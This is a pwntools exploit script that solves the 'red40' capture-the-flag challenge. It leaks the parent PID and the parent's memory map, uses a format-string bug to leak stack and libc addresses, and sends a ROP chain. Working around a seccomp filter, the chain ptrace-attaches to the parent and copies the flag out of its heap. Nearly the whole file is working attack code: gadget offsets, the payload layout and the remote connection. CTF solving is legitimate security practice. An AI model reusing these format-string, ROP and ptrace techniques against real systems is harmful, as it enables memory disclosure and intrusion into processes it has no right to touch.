#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = '../red40'
elf = context.binary = ELF(exe, checksec=True)
parent = '../parent'
paret = ELF(parent, checksec=False)
libc = '../libc/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'red40.ctf.umasscybersec.org', 1337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe, 'loop'] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    elif args.PARENT:
        return process([parent, 'fork'] + argv)
    elif args.HEH:
        return gdb.debug([parent, 'fork'] + argv, gdbscript=gdbscript)
    else:
        return process([exe, 'loop'] + argv)

gdbscript = '''
init-pwndbg
set detach-on-fork off
break *main+155
break *forker+27
break *forker+101 
break *warn_get+213
'''.format(**locals())
# break *warn_get+124

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ seccomp-tools dump "./red40 loop"
#  line  CODE  JT   JF      K
# =================================
#  0000: 0x20 0x00 0x00 0x00000004  A = arch
#  0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010
#  0002: 0x20 0x00 0x00 0x00000000  A = sys_number
#  0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
#  0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010
#  0005: 0x15 0x03 0x00 0x00000029  if (A == socket) goto 0009
#  0006: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0009
#  0007: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0009
#  0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW
#  0009: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
#  0010: 0x06 0x00 0x00 0x00000000  return KILL

PTRACE_ATTACH = 16
PTRACE_PEEKDATA = 2
PTRACE_NR = 101
WRITE_NR = 1
STDOUT = 1
PPID = 0 

def craft_ptrace_peek_payload(src, dest) -> bytes:
    payload = flat([
            # PTRACE PEEKDATA
            libc.address + 0x45eb0, # pop rax; ret
            PTRACE_NR,
            libc.address + 0x11f2e7,# pop rdx; pop r12; ret,
            src,
            0,
            libc.sym['ptrace'],

            # move PEEK'd data (rax) to destination
            libc.address + 0x11f2e7, # pop rdx; pop r12; ret,
            dest,
            0,
            libc.address + 0x3a411, # mov dword ptr [rdx], eax ; ret
    ]) 
    return payload

def exploit():
    global io
    io = initialize()
    rop = ROP(libc)

    # ==================
    # GET PARENT PID
    # ==================
    io.sendlineafter(b'>', b'2')
    while(io.recvline().strip()[:7] != b'YOU WON'): # literal gamble
        io.sendlineafter(b'>', b'Y')

    io.sendlineafter(b'>', b'1')
    io.recvuntil(b'You are now appreciating your ')
    PPID = int(io.recvuntil(b' RED40', drop=True))

    # ==================
    # READ PARENT VMMAP
    # ==================
    io.sendlineafter(b'>', b'5')
    io.sendlineafter(b'>', f'/proc/{PPID}/maps'.encode())

    io.recvline()
    io.recvlines(5) # remote
    heap = int(io.recvuntil(b'-', drop=True), 16)
    flag_heap = heap + 0x290 + 0x10
    
    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b'>', b'%10$p|%41$p')
    
    io.recvline() 
    leak = io.recvline().strip().replace(b'0x', b'').split(b'|')
    stack = int(leak[0], 16)
    libc.address = int(leak[1], 16) - 128 - libc.sym['__libc_start_main']
    stack = stack - 0x188

    # ==================
    # LEAKING FLAG
    # ==================
    payload = b''
    payload += flat({
        56: [
            # PTRACE ATTACH
            libc.address + 0x45eb0, # pop rax; ret
            PTRACE_NR,
            libc.address + 0x2a3e5, # pop rdi; ret
            PTRACE_ATTACH,
            libc.address + 0x2be51, # pop rsi; ret,
            PPID,
            libc.address + 0x11f2e7, # pop rdx; pop r12; ret,
            0x0,
            0x0,
            libc.sym['ptrace'],

            # SLEEP WAIT
            libc.address + 0x2a3e5, # pop rdi; ret
            0x10,
            libc.sym['sleep'],

            # RDI AND RSI FOR PEEKDATA
            libc.address + 0x2a3e5, # pop rdi; ret
            PTRACE_PEEKDATA,
            libc.address + 0x2be51, # pop rsi; ret,
            PPID,

        ]
    })

    for i in range(0, 40, 4):
        payload += craft_ptrace_peek_payload(flag_heap + i, stack + i)

    payload += flat([
            # WRITE
            libc.address + 0x45eb0, # pop rax; ret
            WRITE_NR,
            libc.address + 0x2a3e5, # pop rdi; ret
            STDOUT,
            libc.address + 0x2be51, # pop rsi; ret,
            stack,
            libc.address + 0x11f2e7, # pop rdx; pop r12; ret,
            0x40,
            0x0,
            libc.sym['write'],
    ])

    io.sendlineafter(b'>', payload)

    log.success('parent heap base: %#x', heap)
    log.success('child stack leak: %#x', stack)
    log.success('child libc base: %#x', libc.address)
    log.success('ppid: %d', PPID)
    
    io.interactive()
    
if __name__ == '__main__':
    exploit()